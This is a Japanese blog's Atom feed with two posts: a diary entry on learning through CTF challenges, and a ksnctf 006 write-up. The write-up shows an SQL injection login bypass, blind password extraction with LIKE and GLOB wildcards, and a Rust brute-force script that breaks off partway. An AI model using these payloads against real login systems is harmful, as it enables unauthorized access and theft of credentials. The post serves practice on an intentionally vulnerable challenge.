@@ -1,0 +1,1768 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="jp"><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" hreflang="jp" /><updated>2021-07-29T15:24:27+00:00</updated><id>/feed.xml</id><title type="html">逝く道</title><subtitle>どこまでも逝こう。</subtitle><entry><title type="html">きゃぷちゃーざふらっぐ</title><link href="/contents/diary/2021/05/22/hello.html" rel="alternate" type="text/html" title="きゃぷちゃーざふらっぐ" /><published>2021-05-22T12:38:04+00:00</published><updated>2021-05-22T12:38:04+00:00</updated><id>/contents/diary/2021/05/22/hello</id><content type="html" xml:base="/contents/diary/2021/05/22/hello.html">&lt;p&gt;　最近、Techの記事ばかり書いているが、その原因は偏にCTF(Capture the flag)に手を出し始めたが故である。CTFの問いをひたすら解いている間はとても心が平穏になるため、非常に良い。しかし、あまりに平穏過ぎてDiaryを書きたいと思う瞬間がなかなか訪れない。たまにはDiaryも書いてみようかと。&lt;/p&gt;
+
+&lt;h2 id=&quot;ctf&quot;&gt;CTF&lt;/h2&gt;
+&lt;p&gt;　何が面白いのかと問われればいくつもあるのだが、ここでは一つ挙げようと思う。CTF特有の面白さではないが、最近の私が重要視している事柄であるからご容赦願いたい。&lt;/p&gt;
+
+&lt;p&gt;　ずばり、&lt;strong&gt;未知との遭遇&lt;/strong&gt;である。&lt;/p&gt;
+
+&lt;p&gt;　一応は情報工学を専門として大学を卒業した私であるが、CTFを楽しもうとするとまったくの未知が多量に押し寄せてくる。&lt;/p&gt;
+
+&lt;p&gt;　FLAGを取ったら勝ちというルールであるが、そのための道のりで知らない知識を拾い集めながら進まなければ勝利を手にすることは出来ない。&lt;/p&gt;
+
+&lt;p&gt;　この過程に私は面白さを見出しているし価値を感じている。&lt;/p&gt;
+
+&lt;p&gt;　それは私のこれまでの生き方が原因とも言える。&lt;/p&gt;
+
+&lt;h2 id=&quot;動いたなら良し&quot;&gt;動いたなら良し&lt;/h2&gt;
+&lt;p&gt;　プログラムを学び始めた頃、私の頭の中では&lt;strong&gt;「動いたならそれで良い」&lt;/strong&gt;とばかり考えていた。詳しい動作理念など知らなくとも、プログラムは勝手にコンパイルされて実行したらなぜか期待する動作をしてくれる。そういう存在であった。&lt;/p&gt;
+
+&lt;p&gt;　しかし、いざ社会に出てみると、&lt;strong&gt;より良いコードを目指す&lt;/strong&gt;ことが重要であると知った。ソフトウェアの品質を担保する即ちソースコードの品質を担保するということであり、動いたら良いという指標は役に立たなくなってしまった。&lt;/p&gt;
+
+&lt;p&gt;　この変化には薄々気づいていたのだが、いざそう言われてもでは何を指標にして目の前のソースコードを評価すれば良いのかピンと来ない。今でも十分な評価を与えられない。&lt;/p&gt;
+
+&lt;p&gt;　評価軸はいくつもあるだろう。読みやすさ・見やすさ・論理構造の明瞭さ・制御構造の簡潔さ・関数を一目見て100を理解出来る伝達力・欲しい時に欲しい情報が記述されている注釈などなど。&lt;/p&gt;
+
+&lt;p&gt;　それなりに意識しているが、任せてくださいと言える日は来ない。&lt;/p&gt;
+
+&lt;p&gt;　しかして、「動いたならそれで良い」という思考は修正する方向に向かうのだが、その発想に至る根本は中々治るものではない。&lt;/p&gt;
+
+&lt;h2 id=&quot;テストを通過したなら良し&quot;&gt;テストを通過したなら良し&lt;/h2&gt;
+&lt;p&gt;　学生時代の過ごし方を見ても、やれやれと思わずにはいられない。&lt;/p&gt;
+
+&lt;p&gt;　例えば、学校のテストがあったとしよう。その時の思考はよし勉強するぞと思っているのだが、その勉強方法は&lt;strong&gt;その場しのぎ的な勉強法&lt;/strong&gt;なのだ。&lt;/p&gt;
+
+&lt;p&gt;　つまり、テストが終わったならテストでやった内容はすっかり忘れてしまう。&lt;/p&gt;
+
+&lt;p&gt;　次に生かすような勉強ではないのだ。&lt;/p&gt;
+
+&lt;p&gt;　テストは出題範囲が決まっており、&lt;strong&gt;その範囲をブルートフォースして短期的に覚えておけば&lt;/strong&gt;そこそこの点を取れてしまう。抽象を理解したり知識の鎖を連環させたりと効率良く記憶する必要はなく、一問一答で出そうな問題と解法を覚えておくだけで良いのだ。&lt;/p&gt;
+
+&lt;p&gt;　まあ、この覚え方も思い出すと圧倒的な気力が必要な気もするのだが、難しい事はない。時間をかけてテストぎりぎりまで無限に反復するだけである。その意味で言えば、学生時代を無為に過ごした時間というのは多いと言えるかもしれないが、無類の無限反復能力があったからこそ今があり、今でも短期記憶には多少自信がある。&lt;/p&gt;
+
+&lt;p&gt;　一方で、深い理解をする能力が幼児並みと揶揄されても反論は出来ず、長期記憶に対する信頼はゴミ以下と言える。&lt;/p&gt;
+
+&lt;p&gt;　懐かしき義務教育の期間をこうして振り返っても「動いたならそれで良い」の精神が読み解ける。貴重な思い出だ。&lt;/p&gt;
+
+&lt;h2 id=&quot;ゲームを遊ぶ時も&quot;&gt;ゲームを遊ぶ時も&lt;/h2&gt;
+&lt;p&gt;　誰もが楽しむゲーム一つ取っても残念な事に気づく。&lt;/p&gt;
+
+&lt;p&gt;　アクションゲームやRPGの戦闘は、&lt;strong&gt;テンポ良く瞬間瞬間に問題解決していく&lt;/strong&gt;ことだろう。ゲームというのはこうした些細な積み重ねがいつかは魔王を倒す事に繋がる。一つ一つの問題は小さく大量にちりばめられており、次々と解決していけば自然と操作方法や攻略方法が身についていくものである。&lt;/p&gt;
+
+&lt;p&gt;　一方で、将棋のように一手一手が後の盤面に大きな影響を残すタイプになると途端にどうにもならなくなる。&lt;/p&gt;
+
+&lt;p&gt;　言ってしまえば、一手先すら読むのが困難なのだ。大局どころか数手先の未来は闇の中である。&lt;/p&gt;
+
+&lt;p&gt;　まったく苦手であるとは言わないが、時間はかかるし良い手に辿り着かないし、気が付けば手に負えないと感じてしまう。&lt;/p&gt;
+
+&lt;h2 id=&quot;短期記憶の次がない&quot;&gt;短期記憶の次がない&lt;/h2&gt;
+
+&lt;p&gt;　次々に現れる謎を連続して解くようなのは良いのだが、長期的な視点を重要視されるのはやはり得意ではない。面白いとは感じるのだが、頭の中でどう記憶してどう生かすべきかがなかなかまとまらないのだ。&lt;/p&gt;
+
+&lt;p&gt;　本来は小さな謎を時ながら知識を体系化して長期記憶に蓄えて実践で生かすということなのだろうが、私は長期記憶するプロセスを意識的に行えておらず大抵の場合は短期記憶で打ち止めとなるような学習・実践を行う癖があると言えるだろう。&lt;/p&gt;
+
+&lt;p&gt;　勿論何もかもが短期記憶で止まるかといえばそうではない。長期記憶にするかしないかの区分けの仕方は不明だが、長期記憶に行く事柄は行くのである。ただ、その量は常人と比較すれば微々たる量だろう。&lt;/p&gt;
+
+&lt;p&gt;　結局、しっかり覚えようと思ったら、しっかり時間を取らないと覚えられない。&lt;/p&gt;
+
+&lt;p&gt;　戦いながら成長することはほとんどないということだ。このことが一般的であるかは分からない。ただ、一般的にはみんな戦いながら成長しているように見える。影なる努力かもしれないが。&lt;/p&gt;
+
+&lt;h2 id=&quot;未知への免疫不足&quot;&gt;未知への免疫不足&lt;/h2&gt;
+&lt;p&gt;　結局のところ、既知の事柄を短期的に記憶して、瞬間的にささっと処理していくことばかりやってきたのだ。精度や正確性が決して高いわけではない。ただ、そうしてきた。&lt;/p&gt;
+
+&lt;p&gt;　すると、ちょっと複雑な未知に遭遇すると途端に崩壊する。&lt;/p&gt;
+
+&lt;p&gt;　ささっと処理できないのだ。仮に無理やり通したとしてもそのことが後に影響して良い結果を得られないで終わる。&lt;/p&gt;
+
+&lt;p&gt;　従って、私は&lt;strong&gt;ちょっと複雑な未知を解決するプロセス&lt;/strong&gt;を鍛えたいと思っていた。&lt;/p&gt;
+
+&lt;p&gt;　&lt;strong&gt;CTF はその良い題材になりうる&lt;/strong&gt;と感じている。&lt;/p&gt;
+
+&lt;p&gt;　初めはそういうつもりではなかったが、やってみるとまさに求めていたものであった。というより、ああ私が苦手だったのはこれなのかと痛感したわけである。&lt;/p&gt;
+
+&lt;p&gt;　CTF は大抵の場合、私にとって未知の要素を用いて展開される。だからまずは未知の要素を知るところから始まる。&lt;/p&gt;
+
+&lt;p&gt;　このプロセスは何も CTF に限ったことではなく、日常的に過ごしていれば、特に仕事では普通のプロセスだと今では思う。仕事を遂行するために全てが既知であることなどあるだろうか。少なくとも前の職場は未知の割合の方が多かった。&lt;/p&gt;
+
+&lt;p&gt;　&lt;strong&gt;未知への免疫を育てることが私を前に進ませるのだ。&lt;/strong&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;自分の成長を眺める&quot;&gt;自分の成長を眺める&lt;/h2&gt;
+&lt;p&gt;　このブログは日記・技術足跡・自作小説で展開していたが、今回のCTFに取り組むに当たり、&lt;strong&gt;「Memo」&lt;/strong&gt;なるページも追加することをした。&lt;/p&gt;
+
+&lt;p&gt;　いわば、 wiki のようなものだ。&lt;/p&gt;
+
+&lt;p&gt;　これでこのブログにも記憶領域と呼べる空間が出来た。&lt;/p&gt;
+
+&lt;p&gt;　長期記憶が苦手でもこのブログが私の代わりに記憶してくれる。もちろん、未知への免疫を高めることを通じて、私自身の長期記憶の性能も高まると期待しているが、このブログのMemoほどの性能にはならないだろう。&lt;/p&gt;
+
+&lt;p&gt;　また、Memoとしてまとめることで、私の長期記憶への反映が安定するようにもなっている。Memoに書いたことならいまのところほとんどを記憶している。ついこの前も非同期通信についての知識をMemoを見ずに諳んじることが出来たほどだ。&lt;/p&gt;
+
+&lt;p&gt;　私はこのブログと共に成長していこうと思う。&lt;/p&gt;
+
+&lt;p&gt;　心が淀んだ時にいろいろと吐き出せる場所としての日記だとも思っていたが、今日のは未来に繋がるような明るい日記になってしまった。&lt;/p&gt;
+
+&lt;p&gt;　たまにはこういうのも良い。&lt;/p&gt;
+
+&lt;p&gt;　それでは。また。&lt;/p&gt;</content><author><name></name></author><category term="contents" /><category term="diary" /></entry><entry><title type="html">ksnctf 006 Login</title><link href="/contents/tech/ctf_ksnctf/2021/05/21/006.html" rel="alternate" type="text/html" title="ksnctf 006 Login" /><published>2021-05-21T12:38:04+00:00</published><updated>2021-05-21T12:38:04+00:00</updated><id>/contents/tech/ctf_ksnctf/2021/05/21/006</id><content type="html" xml:base="/contents/tech/ctf_ksnctf/2021/05/21/006.html">&lt;h2 id=&quot;ksnctf-006-login&quot;&gt;ksnctf 006 Login&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;問題公開日: 2012/05/26&lt;/li&gt;
+  &lt;li&gt;ジャンル: web&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;謎解き&quot;&gt;謎解き&lt;/h3&gt;
+&lt;p&gt;　正しい &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pass&lt;/code&gt; を入れる問題だ。&lt;/p&gt;
+
+&lt;p&gt;　と言っても特別ヒントはない。が、これはおそらく &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SQLインジェクション&lt;/code&gt; と呼ばれる脆弱性を突く問題だろう。&lt;/p&gt;
+
+&lt;p&gt;　ユーザーの管理は基本的にDB管理しているものだろう。となれば、ブラウザからの入力を受けて SQL を発行していると考えられる。&lt;/p&gt;
+
+&lt;p&gt;　この時、入力を通して、意図しない動作をユーザーが任意に行える場合がある。&lt;/p&gt;
+
+&lt;p&gt;　ということで、その方針で進めてみる。&lt;/p&gt;
+
+&lt;h3 id=&quot;適当に&quot;&gt;適当に&lt;/h3&gt;
+
+&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;na&quot;&gt;admin&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;admin&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;pass&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;OR&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'t' = 't&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;　と入れてみると、見事に画面が切り替わる。&lt;/p&gt;
+
+&lt;p&gt;　そこに寄れば、「&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt; のパスワードこそがフラグだ」と記されている。&lt;/p&gt;
+
+&lt;p&gt;　このページから分かることは様々あるが、重要なことは。&lt;/p&gt;
+
+&lt;p&gt;　まず、DBは &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sqlite&lt;/code&gt; である&lt;/p&gt;
+
+&lt;p&gt;　次に、クエリの構成が以下である。&lt;/p&gt;
+
+&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;user&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'$id'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AND&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'$pass'&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;　先ほどの入力はつまり、&lt;/p&gt;
+
+&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;user&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'admin'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AND&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;OR&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'t'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'t'&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;　となっていたからSQLが通ったわけである。 OR 以降が必ず true になるため。&lt;/p&gt;
+
+&lt;p&gt;　さて、これらを踏まえて、早速 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt; のパスワードを特定しよう。&lt;/p&gt;
+
+&lt;p&gt;　id については &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt; で間違いないが、 pass をどうやって特定しようか。&lt;/p&gt;
+
+&lt;h3 id=&quot;特定する&quot;&gt;特定する&lt;/h3&gt;
+
+&lt;p&gt;　色々考えたが、結局ブルートフォース案しか浮かばなかったので、それにする。&lt;/p&gt;
+
+&lt;p&gt;　SQLにはワイルドカードを利用出来る。即ち、&lt;/p&gt;
+
+&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;user&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'admin'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AND&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;OR&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pass&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;LIKE&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'%'&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;　という指定の仕方だ。 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%&lt;/code&gt; は LIKE におけるワイルドカードであり、0文字以上の文字とヒットする。従って、上記のSQLは確実に通る。&lt;/p&gt;
+
+&lt;p&gt;　&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_&lt;/code&gt; もあり、これは任意の1文字とヒットする。&lt;/p&gt;
+
+&lt;p&gt;　これを使って、文字数を特定できる。一文字ずつ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_&lt;/code&gt; を増やして入力を試してみると、&lt;/p&gt;
+
+&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;-- pass の長さは 21文字&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;user&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'admin'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AND&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;OR&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pass&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;LIKE&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'_____________________'&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;　であることが分かった。上記のSQLは通る。&lt;/p&gt;
+
+&lt;p&gt;　また、フラグの形式は &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FLAG_......&lt;/code&gt; であることも踏まえると、以下まで確定する。&lt;/p&gt;
+
+&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;-- `FLAG_` を除いた pass の長さは 16文字&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;user&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'admin'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AND&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;OR&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pass&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;LIKE&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'FLAG_________________'&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;　FLAGに使われる文字は &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[a-z]&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[A-Z]&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[0-9]&lt;/code&gt; の62文字であり、ブルートフォースを仕掛けた場合、 62文字 * 16文字 = 992文字 である。それほど多くはない。&lt;/p&gt;
+
+&lt;p&gt;　というわけで何とかなりそうである。&lt;/p&gt;
+
+&lt;h3 id=&quot;like-ではなく-glob&quot;&gt;LIKE ではなく GLOB&lt;/h3&gt;
+
+&lt;p&gt;　実は &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sqlite&lt;/code&gt; の &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LIKE&lt;/code&gt; は大文字と小文字を区別してくれない。&lt;/p&gt;
+
+&lt;p&gt;　そのため、ブルートフォースを仕掛ける前にSQLを修正する必要がある。&lt;/p&gt;
+
+&lt;p&gt;　&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LIKE&lt;/code&gt; ではなく &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GLOB&lt;/code&gt; を使うようにするということだ。&lt;/p&gt;
+
+&lt;p&gt;　パターンマッチングを利用する &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GLOB&lt;/code&gt; を用いる。&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;LIKE&lt;/th&gt;
+      &lt;th&gt;GLOB&lt;/th&gt;
+      &lt;th&gt;説明&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%&lt;/code&gt;&lt;/td&gt;
+      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*&lt;/code&gt;&lt;/td&gt;
+      &lt;td&gt;任意の0文字以上&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_&lt;/code&gt;&lt;/td&gt;
+      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?&lt;/code&gt;&lt;/td&gt;
+      &lt;td&gt;任意の1文字&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;　&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GLOB&lt;/code&gt; では &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%&lt;/code&gt; の代わりに &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*&lt;/code&gt; を、&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_&lt;/code&gt; の代わりに &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?&lt;/code&gt; を使う。従って、&lt;/p&gt;
+
+&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;-- GLOB ver&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;user&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'admin'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AND&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;OR&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pass&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GLOB&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'FLAG_????????????????'&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;　となる。&lt;/p&gt;
+
+&lt;p&gt;　これで抑えるべき事項は全てだ。&lt;/p&gt;
+
+&lt;p&gt;　後はブルートフォースを仕掛けるだけだ。手作業だと大変なので、プログラムで行う。&lt;/p&gt;
+
+&lt;p&gt;　毎度お馴染みRustの時間である。&lt;/p&gt;
+
+&lt;h3 id=&quot;ブルートフォース&quot;&gt;ブルートフォース&lt;/h3&gt;
+
+&lt;div class=&quot;language-rust highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;crate&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reqwest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;nd&quot;&gt;#[tokio::main]&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;async&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;fn&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Box&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dyn&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;nn&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Error&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strings&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;a&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;b&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;d&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;e&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;f&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;g&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;h&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;i&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;j&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;k&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;l&quot;&lt;/span&gt;&lt;span 